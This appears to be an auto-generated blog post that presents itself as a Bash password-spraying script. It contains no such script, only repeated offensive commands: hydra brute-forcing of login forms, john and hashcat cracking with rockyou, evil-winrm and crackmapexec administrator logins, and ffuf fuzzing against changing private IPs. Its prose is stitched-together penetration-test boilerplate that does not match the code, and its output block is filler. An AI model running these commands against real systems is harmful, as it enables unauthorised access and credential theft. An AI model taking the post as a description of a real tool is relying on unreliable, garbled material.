---
TitleSEO: "Password Spraying Tool in Bash | ZureFX"
TitlePost: "Password Spraying Tool — Bash"
Author: "ZureFX"
Description: "A Bash script for password spraying tool. Built for security research and automation."
Keywords: "powershell, scanner, bash, go"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-334.html"
URL_IMAGES: ""
Date: "2024-07-01"
Tags: "PowerShell, Scanner, Bash, Go"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-334"
Permalink: "/scripting/script-password-spraying-tool-334.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `lookupsid`
- `crackmapexec`
- `enum4linux`

## Implementation

### Core Logic

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.68.90.163 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.8.54 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.24.146.149 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.221.158 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.96.136.40 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.79.170.252 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.76.204.15/FUZZ
crackmapexec smb 10.76.146.15 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.73.48.147/FUZZ
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 9.88s
```
